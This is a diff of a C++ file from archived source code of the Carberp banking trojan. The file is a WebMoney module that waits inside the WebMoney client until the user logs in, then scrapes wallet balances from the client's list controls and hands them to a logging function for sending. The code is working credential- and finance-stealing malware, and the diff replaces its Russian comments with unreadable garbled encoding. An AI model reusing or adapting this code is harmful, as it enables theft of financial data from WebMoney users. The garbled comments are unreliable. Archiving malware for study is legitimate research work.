@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 // web_money_dll.cpp : Defines the entry point for the DLL application.
 //
 
@@ -27,12 +38,12 @@ void WebMonyLoger_Template(STR Str)
 
 #define DBG_Messag WebMonyLoger_Template<>
 
-// Макрос для получения выделенного Item  в TabCtrl
+// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ Item  пїЅ TabCtrl
 
 #define pTabCtrl_GetCurSel(hwnd, i) \
     (int)pSendMessageA((hwnd), TCM_GETCURSEL, (WPARAM)(i), 0)
 
-// Макрос для измения текста заданого  Itemа  в TabCtrl	(не используеться нужен был для тестирования)
+// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ  ItemпїЅ  пїЅ TabCtrl	(пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ)
 #define pListView_SetItemText(hwndLV, i, iSubItem_, pszText_) \
 { LV_ITEM _macro_lvi;\
   _macro_lvi.iSubItem = (iSubItem_);\
@@ -40,7 +51,7 @@ void WebMonyLoger_Template(STR Str)
   pSendMessageA((hwndLV), LVM_SETITEMTEXT, (WPARAM)(i), (LPARAM)(LV_ITEM *)&_macro_lvi);\
 }
 
-///// Макрос для получения  текста заданого  Itemа  в TabCtrl
+///// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ  пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ  ItemпїЅ  пїЅ TabCtrl
 #define pListView_GetItemText(hwndLV, i, iSubItem_, pszText_, cchTextMax_) \
 { LV_ITEM _macro_lvi;\
   _macro_lvi.iSubItem = (iSubItem_);\
@@ -54,7 +65,7 @@ extern"C" void check(HWND hwnd);
 
 HMODULE hDll;
 
-// получает баланс вебмани
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 void GetWebmoneyBalans(HWND hwnd,char* buf_str ){
 	int count = (int)pSendMessageA(hwnd,LVM_GETITEMCOUNT,0,0);//ListView_GetItemCount(hwnd);
 	*buf_str = 0;
@@ -74,10 +85,10 @@ void GetWebmoneyBalans(HWND hwnd,char* buf_str ){
 	};
 
 };
-// отправляет баланс 
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ 
 void SendBalanseToLog(PCHAR Coment);
 
-//вызывает  функцию получения баланса, и если баланс получен(бывает просто пустая строка с пробелами) то пишет его в буфер 
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ(пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ) пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ 
 void check(HWND hwnd,PCHAR Buffer)
 {
 char*str_list = (char*)MemAlloc(16*1024);
@@ -91,7 +102,7 @@ MemFree(str_list);
 
 
 
-//	перебирает все дочернее окна для определения нужных окон в вебмани
+//	пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 //
 BOOL CALLBACK EnumWindowsProc0( HWND hwnd_WebMoney,
 							   LPARAM lParam
@@ -101,7 +112,7 @@ BOOL CALLBACK EnumWindowsProc0( HWND hwnd_WebMoney,
 	DWORD pid = 0;
 	BOOL IsLogonWindow = TRUE;
 	BOOL IsMoneyWindow = FALSE;
-// проверка пренадлежыт ли окно текущему процессу (тоесть вебмани)
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ (пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ)
 	pGetWindowThreadProcessId(hwnd_WebMoney,&pid);
 	if ((DWORD)pGetCurrentProcessId() ==  pid)
 	{
@@ -114,7 +125,7 @@ BOOL CALLBACK EnumWindowsProc0( HWND hwnd_WebMoney,
 			return TRUE;
 
 
-		while(IsLogonWindow)		/// цикл будет работать до тех пор пока не введем пароль
+		while(IsLogonWindow)		/// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		{
 			IsLogonWindow = FALSE;
 			do
@@ -133,7 +144,7 @@ BOOL CALLBACK EnumWindowsProc0( HWND hwnd_WebMoney,
 		if (IsLogonWindow)	
 			return TRUE;
 	
-		// цикл будет ждать пока вебмани не инициализирует все свои окна
+		// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 		IsLogonWindow = FALSE;
 		do
 		{	
@@ -151,10 +162,10 @@ BOOL CALLBACK EnumWindowsProc0( HWND hwnd_WebMoney,
 
 
 		pSleep(10000);
-	//  делаем поиск котролов класса SysTabControl32 в окнах вебмани, в одном из таких окон находиться баланс
+	//  пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ SysTabControl32 пїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	//
 		hwnd = (HWND)pFindWindowExA(hwnd,0,"SysTabControl32",NULL);
-		while( 1 != pTabCtrl_GetCurSel(hwnd,1))	// ждем пока не будет активной вкладка кошельков
+		while( 1 != pTabCtrl_GetCurSel(hwnd,1))	// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 			pSleep(100);
 		pSleep(1000);
 		IsMoneyWindow = TRUE;
@@ -163,7 +174,7 @@ BOOL CALLBACK EnumWindowsProc0( HWND hwnd_WebMoney,
 		PCHAR Buffer = STR::Alloc(4096);
 		m_memset(Buffer,0,4096);
 		DBG_Messag("after WEBMoney!!!");
-	//	собственно получения данных из SysListView32, там список кошельков 
+	//	пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ SysListView32, пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ 
 	/// 
 		do
 		{	
@@ -171,7 +182,7 @@ BOOL CALLBACK EnumWindowsProc0( HWND hwnd_WebMoney,
 			check(hwnd,Buffer);
 		}while(hwnd);
 
-		// собственно если получили какието данные отправляем их в лог
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅ пїЅпїЅпїЅ
 		if ( plstrlenA(Buffer))
 		{
 			DBG_Messag(Buffer);
@@ -206,14 +217,14 @@ BOOL CALLBACK EnumWindowsProc0( HWND hwnd_WebMoney,
 }
 
 
-//Процедура потока в которой происходит перебор всех окон в системе
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 //
 DWORD WINAPI ThreadProc(PVOID p)
 {
 	DWORD IsExit = 0;
 	Sleep(3000);
 	hDll  = (HMODULE)pLoadLibraryA("shlwapi.dll");
-// перебор всех окон пока не найдем нужное и не получем баланс
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	do
 	{	
 		pEnumWindows(EnumWindowsProc0,(LPARAM)&IsExit); 
@@ -224,7 +235,7 @@ DWORD WINAPI ThreadProc(PVOID p)
 	return 0;
 };
 
-/// запуск перебора окон в отдельном потоке (на самом деле хуков не ставит)
+/// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ (пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ)
 void HookWebMoney()
 {
 	HANDLE hThread ;		
@@ -234,7 +245,7 @@ void HookWebMoney()
 
 };
 
-// возвращает true если текущий процесс вебмани
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ true пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 bool IsWebMoney()
 {
 	WCHAR *ModulePath = (WCHAR*)MemAlloc( MAX_PATH );
@@ -256,7 +267,7 @@ bool IsWebMoney()
 };
 
 
-// отсылка баланса
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
 void SendBalanseToLog(PCHAR Coment)
 {		
